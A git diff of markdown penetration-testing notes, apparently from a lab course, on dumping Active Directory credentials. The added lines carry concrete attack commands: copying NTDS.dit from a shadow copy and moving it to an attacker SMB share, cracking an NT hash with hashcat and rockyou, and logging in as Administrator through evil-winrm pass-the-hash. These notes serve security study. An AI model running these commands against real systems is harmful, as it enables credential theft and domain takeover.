@@ -23,7 +23,7 @@ crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.
   * the `NTDS.dit` file is stored at `%systemroot%/ntds` on the domain controllers in a [forest](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/using-the-organizational-domain-forest-model). The `.dit` stands for [directory information tree](https://docs.oracle.com/cd/E19901-01/817-7607/dit.html).
   * This is the primary database file associated with AD and stores all domain usernames, password hashes, and other critical schema information
 
-\#ev
+[evil-winrm.md](evil-winrm.md "mention")
 
 **Checking Local Group Membership**
 
@@ -132,7 +132,7 @@ Successfully created shadow copy for 'C:\'
 cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
 ```
 
-* \[\[Create SMB server Linux (HACK)]]
+* [create-smb-server-linux-hack.md](create-smb-server-linux-hack.md "mention")
 
 ```shell-session
 cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
@@ -140,11 +140,18 @@ cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
 
 ### Crack the NT hash with hashcat
 
-!\[\[Hashcat#Cracking the NT Hash with Hashcat]]
+```
+sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
+Copy
+```
+
+
 
 * What if we are unsuccessful in cracking a hash?
-* use \[\[Evil-WinRM#Pass-the-Hash|Pass the Hash]]
+* use [#pass-the-hash](evil-winrm.md#pass-the-hash "mention")
 
 ### Pass-the-Hash Considerations
 
-* \[\[Pass the Hash (PtH)]] !\[\[Evil-WinRM#Pass-the-Hash with Evil-WinRM Example]]
+```
+evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
+```
